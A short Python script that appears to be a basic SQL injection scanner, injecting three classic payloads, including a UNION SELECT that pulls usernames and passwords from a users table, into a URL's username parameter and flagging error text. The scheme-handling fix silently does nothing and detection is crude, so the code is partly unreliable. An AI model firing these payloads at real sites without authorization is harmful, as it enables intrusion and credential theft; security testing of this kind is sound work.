import requests
import logging
from urllib.parse import urlparse, urlunparse, urlencode, parse_qs

SQLI_PAYLOADS = [
    "' OR 1=1 --",  # Simple SQLi payload
    "' OR 'a'='a",   # Always true SQLi payload
    "' UNION SELECT NULL, username, password FROM users --"  # Union-based SQLi payload
]

def scan_sql_injection(url):
    logging.info(f"Scanning SQL Injection for URL: {url}")
    
    # Ensure the URL starts with http:// or https://
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = "http://" + url  # Default to http:// if no scheme is provided

    # Parse the URL to extract query parameters and ensure proper formatting
    query_params = parse_qs(parsed_url.query)

    # Loop through each payload and append to the query
    for payload in SQLI_PAYLOADS:
        # Replace the username parameter with the SQLi payload
        query_params['username'] = [payload]  # We expect the username parameter to be in the URL

        # Rebuild the URL with the payload appended correctly
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse(parsed_url._replace(query=new_query))

        try:
            logging.debug(f"Testing payload URL: {new_url}")
            response = requests.get(new_url)

            # Check for typical SQL injection responses
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                logging.warning(f"SQLi vulnerability detected: {new_url}")
                return True  # Return True if SQLi is detected
        except Exception as e:
            logging.error(f"Error while sending request: {e}")
            return False  # Return False if there was an error or issue with the request

    return False  # Return False if no SQLi is detected
